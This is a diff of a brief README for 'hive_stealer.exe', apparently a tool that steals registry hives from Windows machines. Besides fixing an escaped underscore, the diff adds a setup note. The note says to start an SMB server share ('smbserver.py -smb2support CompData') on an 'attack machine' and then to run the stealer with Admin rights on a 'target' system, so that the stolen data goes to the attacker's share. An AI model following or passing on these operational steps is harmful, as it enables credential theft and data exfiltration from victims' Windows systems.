@@ -14,7 +14,7 @@ Usage:
 
 ```
 
-hive\_stealer.exe
+hive_stealer.exe
 
 ```
 
@@ -29,3 +29,6 @@ hive\_stealer.exe
 
 
 * Just run as Administrator
+
+### Note:
+  - Quick setup: Run python smbserver.py -smb2support CompData . on your attack machine first, then execute the tool on the target Windows system with Admin rights.
